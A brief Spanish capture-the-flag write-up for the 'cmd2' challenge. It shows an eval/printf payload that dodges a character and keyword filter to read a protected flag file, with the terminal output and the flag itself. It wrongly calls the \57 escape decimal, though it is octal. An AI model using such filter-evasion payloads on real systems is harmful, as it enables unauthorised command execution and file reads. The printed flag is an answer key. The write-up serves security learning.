# cmd2

Estoy seguro de que hay metodos mas limpios de resolver esto pero mi solucion fue esta: 

`eval  $(printf "\57usr\57bin\57cat \57home\57cmd2\57fl%s" "ag")`

El subcomando de `printf` se expande a "/usr/bin/cat /home/cmd2/flag", en un principio intente usar `\x2f` como secuencia de escape para `/` pero fue malinterpretado por el programa asi que usé su equivalente en decimal `\57`

El comando `eval` ejecuta una cadena como comandos de shell dinamicamente

Ambos `printf` y `eval` son comandos "built-in" o internos de la shell por lo que no dependen del PATH
```
cmd2@ubuntu:~$ ./cmd2 'eval  $(printf "\57usr\57bin\57cat \57home\57cmd2\57fl%s" "ag")'
eval  $(printf "\57usr\57bin\57cat \57home\57cmd2\57fl%s" "ag")
Shell_variables_can_be_quite_fun_to_play_with!
```

`Shell_variables_can_be_quite_fun_to_play_with!`
